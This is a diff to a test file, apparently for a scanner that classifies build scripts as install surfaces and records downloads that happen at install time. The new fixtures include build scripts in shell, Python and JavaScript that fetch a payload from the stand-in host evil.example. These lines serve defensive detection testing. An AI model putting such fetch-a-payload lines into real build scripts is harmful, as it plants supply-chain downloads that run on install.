@@ -338,12 +338,21 @@ test("common build scripts are classified as install surfaces", () => {
   for (const path of [
     "build.sh",
     "build.bash",
+    "build.zsh",
+    "build.fish",
+    "build.ksh",
     "build.py",
+    "build.rb",
+    "build.js",
+    "build.mjs",
+    "build.cjs",
+    "build.ts",
     "build.bat",
     "build.cmd",
     "build.ps1",
     "scripts/build.sh",
     "tools/build.py",
+    "nested/build.js",
   ]) {
     expect({ path, surfaces: surfacesOf(path) }).toEqual({
       path,
@@ -373,9 +382,14 @@ test("an install-time download inside a build script is recorded as a download",
       "#!/bin/sh\ncurl -fsSL https://evil.example/payload -o /tmp/payload\n",
     ],
     [
+      "build.zsh",
+      "#!/bin/zsh\ncurl -fsSL https://evil.example/payload -o /tmp/payload\n",
+    ],
+    [
       "build.py",
       "import urllib.request\nurllib.request.urlopen('https://evil.example/payload')\n",
     ],
+    ["build.js", "fetch('https://evil.example/payload')\n"],
   ] as const) {
     const inspection = inspected(path, content);
     expect({ path, downloads: inspection.downloads }).toEqual({
@@ -397,6 +411,10 @@ test("ordinary source files with similar names do not become install surfaces", 
     "building.js",
     "build.txt",
     "src/builder.ts",
+    "builder.js",
+    "build.js.txt",
+    "mybuild.sh",
+    "build.sh.bak",
   ]) {
     expect(surfacesOf(path)).not.toContain("installScripts");
   }
